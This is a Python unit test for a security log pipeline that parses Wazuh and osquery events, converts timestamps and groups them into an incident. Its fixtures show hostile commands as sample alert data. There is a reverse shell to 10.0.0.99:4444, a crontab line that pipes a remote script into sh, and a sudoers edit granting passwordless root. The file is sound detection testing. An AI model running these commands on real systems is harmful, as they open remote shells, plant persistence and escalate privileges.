import unittest
from typing import Dict, Any, List
import json
import os

from quick_etl import to_epoch_ms, to_unix_seconds, correlate_events, parse_wazuh_entry, parse_osquery_entry

class TestTimestamps(unittest.TestCase):
    def test_to_epoch_ms_iso_strings(self):
        cases = [
            ("2026-10-02T08:15:30.120+0000", 1790928930120, 1790928930),
            ("2026-10-02T08:22:11.450+0000", 1790929331450, 1790929331),
            ("2026-10-02T08:30:05.780+0000", 1790929805780, 1790929805),
            ("2026-10-02T08:15:30Z", 1790928930000, 1790928930),
            ("2026-10-02T08:15:30+0300", 1790918130000, 1790918130),
            ("2026-10-02T08:15:30+03:00", 1790918130000, 1790918130),
            ("2026-10-02 08:15:30", 1790928930000, 1790928930),
        ]

        for val, exp_ms, exp_sec in cases:
            with self.subTest(val=val):
                self.assertEqual(to_epoch_ms(val), exp_ms)
                self.assertEqual(to_unix_seconds(val), exp_sec)

    def test_to_epoch_ms_numerics(self):
        cases = [
            (1790928935, 1790928935000, 1790928935),
            (1790928935000, 1790928935000, 1790928935),
            ("1790928935", 1790928935000, 1790928935),
        ]

        for val, exp_ms, exp_sec in cases:
            with self.subTest(val=val):
                self.assertEqual(to_epoch_ms(val), exp_ms)
                self.assertEqual(to_unix_seconds(val), exp_sec)

    def test_to_epoch_ms_invalid(self):
        cases = [None, "", "garbage", True, False]

        for val in cases:
            with self.subTest(val=val):
                self.assertIsNone(to_epoch_ms(val))
                self.assertEqual(to_unix_seconds(val), 0)

    def test_pipeline_integration(self):
        # 3 Wazuh and 3 osquery samples
        wazuh_data = [
          {
            "timestamp": "2026-10-02T08:15:30.120+0000",
            "rule": {
              "level": 10,
              "description": "Possible privilege escalation via sudoers modification",
              "id": "5715",
              "mitre": { "id": ["T1548.003"] }
            },
            "agent": { "id": "001", "name": "prod-web-01", "ip": "192.168.10.15" },
            "data": { "command": "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" },
            "full_log": "Oct 02 08:15:30 prod-web-01 sudoers: user modified sudoers configuration"
          },
          {
            "timestamp": "2026-10-02T08:22:11.450+0000",
            "rule": {
              "level": 3,
              "description": "User login successful",
              "id": "5501"
            },
            "agent": { "id": "002", "name": "db-internal-01", "ip": "192.168.10.20" },
            "full_log": "Oct 02 08:22:11 db-internal-01 sshd[1244]: Accepted publickey for ubuntu"
          },
          {
            "timestamp": "2026-10-02T08:30:05.780+0000",
            "rule": {
              "level": 12,
              "description": "Reverse shell execution detected",
              "id": "100201",
              "mitre": { "id": ["T1059.004"] }
            },
            "agent": { "id": "001", "name": "prod-web-01", "ip": "192.168.10.15" },
            "data": {
              "win": {
                "eventdata": {
                  "commandLine": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
                }
              }
            },
            "full_log": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
          }
        ]

        osquery_data = [
          {
            "name": "pack_incident_response_process_events",
            "hostIdentifier": "prod-web-01",
            "unixTime": 1790928935,
            "action": "added",
            "columns": {
              "pid": "4312",
              "name": "bash",
              "path": "/bin/bash",
              "cmdline": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
              "uid": "1001"
            }
          },
          {
            "name": "pack_compliance_crontab",
            "hostIdentifier": "prod-web-01",
            "unixTime": 1790928990,
            "action": "added",
            "columns": {
              "command": "curl http://10.0.0.99/mal.sh | sh",
              "path": "/etc/crontab",
              "uid": "0"
            }
          },
          {
            "name": "pack_system_state_socket_events",
            "hostIdentifier": "prod-web-01",
            "unixTime": 1790928920,
            "action": "removed",
            "columns": { "pid": "2041", "remote_address": "192.168.10.1" }
          }
        ]

        raw_events: List[Dict[str, Any]] = []

        for item in wazuh_data:
            doc = parse_wazuh_entry(item)
            if doc:
                raw_events.append(doc)

        for item in osquery_data:
            doc = parse_osquery_entry(item)
            if doc:
                raw_events.append(doc)

        correlated_chunks = correlate_events(raw_events, window_seconds=900)

        # Asserts exactly 1 cluster with 4 events and chunk_id "incident_prod-web-01_0_1790928930"
        self.assertEqual(len(correlated_chunks), 1)
        self.assertEqual(correlated_chunks[0]["event_count"], 4)
        self.assertEqual(correlated_chunks[0]["chunk_id"], "incident_prod-web-01_0_1790928930")

if __name__ == '__main__':
    unittest.main()
